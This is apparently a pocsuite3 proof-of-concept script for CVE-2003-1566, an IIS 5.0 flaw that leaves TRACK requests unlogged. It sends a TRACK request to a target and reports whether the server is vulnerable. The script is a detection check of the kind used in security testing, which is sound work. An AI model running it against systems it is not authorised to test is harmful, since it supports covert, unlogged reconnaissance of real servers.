#!/usr/bin/env python
# -*- coding:utf-8 -*-

import re
from pocsuite3.api import requests as req
from pocsuite3.api import Output, POCBase, register_poc
from urllib.parse import urljoin


headers = {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0',
    'Accept-Encoding' : 'gzip, deflate'

}

def fix_url(url):
    if not url.startswith("http"):
        url = 'http://' + url
    url_new = urljoin(url,'/')
    return url_new

def url_ip_fun(url):
    compile_rule = re.compile(r'\d+[\.]\d+[\.]\d+[\.]\d+')
    url_ip = re.findall(compile_rule, url)
    return url_ip

class TestPOC(POCBase):
    vulID = 'CVE-2003-1566'
    version = '1'
    author = ['LZW','mfz']
    vulDate = '2020-04-01'
    createDate = '2020-04-01'
    updateDate = '2020-12-04'
    references = ['https://www.anquanke.com/vul/id/1107604']
    name = 'IIS服务跟踪日志绕过漏洞(Log Bypass)'
    appPowerLink = 'https://technet.microsoft.com/'
    appName = 'IIS'
    appVersion = 'IIS=5.0'
    vulType = 'Log Bypass'
    desc = '''
            MicrosoftIIS是一款微软开发的WEB服务程序。MicrosoftIIS服务跟踪日志记录存在问题，
            远程攻击者可以利用这个漏洞提交恶意请求而不被记录。
            问题是IIS服务器对"TRACK"请求没有进行日志记录，
            这可导致攻击者对服务器进行探测或生成部分通信不被发现。
            IIS6.0不受此漏洞影响。
    '''
    samples = ['']

    def _verify(self):

        result = {}
        old_url = self.url
        url_need = fix_url(old_url)
        host = url_ip_fun(old_url)
        ip_new2 = ''.join(host)
        headers['Host'] = ip_new2
        r = req.request('TRACK' , url_need, headers=headers )
        response = r.headers
        try:
            if (r.status_code == 200) and (response['server'] == 'Microsoft-IIS/5.0'):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url_need
                result['VerifyInfo']['Path'] = '/'
            else:
                result = ""
        except Exception :
            result = ""
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Fail test')
        return output


register_poc(TestPOC)
